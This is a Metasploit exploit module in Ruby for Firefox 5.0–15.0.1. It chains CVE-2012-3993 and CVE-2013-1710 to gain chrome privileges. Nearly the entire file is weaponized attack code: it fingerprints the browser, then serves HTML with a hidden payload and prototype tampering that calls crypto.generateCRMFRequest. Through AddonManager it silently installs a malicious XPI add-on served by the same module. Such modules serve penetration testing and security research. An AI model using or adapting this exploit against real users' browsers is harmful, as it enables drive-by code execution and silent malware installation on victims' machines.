# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::FirefoxAddonGenerator

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution&#039;,
      &#039;Description&#039;    => %q{
        On versions of Firefox from 5.0 to 15.0.1, the InstallTrigger global, when given
        invalid input, would throw an exception that did not have an __exposedProps__
        property set. By re-setting this property on the exception object&#039;s prototype,
        the chrome-based defineProperty method is made available.

        With the defineProperty method, functions belonging to window and document can be
        overriden with a function that gets called from chrome-privileged context. From here,
        another vulnerability in the crypto.generateCRMFRequest function is used to "peek"
        into the context&#039;s private scope. Since the window does not have a chrome:// URL,
        the insecure parts of Components.classes are not available, so instead the AddonManager
        API is invoked to silently install a malicious plugin.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039;  => [
        &#039;Mariusz Mlynski&#039;, # discovered CVE-2012-3993
        &#039;moz_bug_r_a4&#039;, # discovered CVE-2013-1710
        &#039;joev&#039; # metasploit module
      ],
      &#039;DisclosureDate&#039; => "Aug 6 2013",
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2012-3993&#039;],  # used to install function that gets called from chrome:// (ff<15)
        [&#039;OSVDB&#039;, &#039;86111&#039;],
        [&#039;URL&#039;, &#039;https://bugzilla.mozilla.org/show_bug.cgi?id=768101&#039;],
        [&#039;CVE&#039;, &#039;2013-1710&#039;],  # used to peek into privileged caller&#039;s closure (ff<23)
        [&#039;OSVDB&#039;, &#039;96019&#039;]
      ],
      &#039;BrowserRequirements&#039; => {
        :source  => &#039;script&#039;,
        :ua_name => HttpClients::FF,
        :ua_ver  => lambda { |ver| ver.to_i.between?(5, 15) }
      }
    ))

    register_options([
      OptString.new(&#039;CONTENT&#039;, [ false, "Content to display inside the HTML <body>.", &#039;&#039; ] )
    ], self.class)
  end

  def on_request_exploit(cli, request, target_info)
    if request.uri.match(/\.xpi$/i)
      print_status("Sending the malicious addon")
      send_response(cli, generate_addon_xpi.pack, { &#039;Content-Type&#039; => &#039;application/x-xpinstall&#039; })
    else
      print_status("Sending HTML")
      send_response_html(cli, generate_html(target_info))
    end
  end

  def generate_html(target_info)
    injection = if target_info[:ua_ver].to_i == 15
      "Function.prototype.call.call(p.__defineGetter__,obj,key,runme);"
    else
      "p2.constructor.defineProperty(obj,key,{get:runme});"
    end

    %Q|
      <html>
      <body>
      #{datastore[&#039;CONTENT&#039;]}
      <div id=&#039;payload&#039; style=&#039;display:none&#039;>
      if (!window.done){
        window.AddonManager.getInstallForURL(
          &#039;#{get_module_uri}/addon.xpi&#039;,
          function(install) { install.install() },
          &#039;application/x-xpinstall&#039;
        );
        window.done = true;
      }
      </div>
      <script>
      try{InstallTrigger.install(0)}catch(e){p=e;};
      var p2=Object.getPrototypeOf(Object.getPrototypeOf(p));
      p2.__exposedProps__={
        constructor:&#039;rw&#039;,
        prototype:&#039;rw&#039;,
        defineProperty:&#039;rw&#039;,
        __exposedProps__:&#039;rw&#039;
      };
      var s = document.querySelector(&#039;#payload&#039;).innerHTML;
      var q = false;
      var register = function(obj,key) {
        var runme = function(){
          if (q) return;
          q = true;
          window.crypto.generateCRMFRequest("CN=Me", "foo", "bar", null, s, 384, null, "rsa-ex");
        };
        try {
          #{injection}
        } catch (e) {}
      };
      for (var i in window) register(window, i);
      for (var i in document) register(document, i);
      </script>
      </body>
      </html>
    |
  end
end

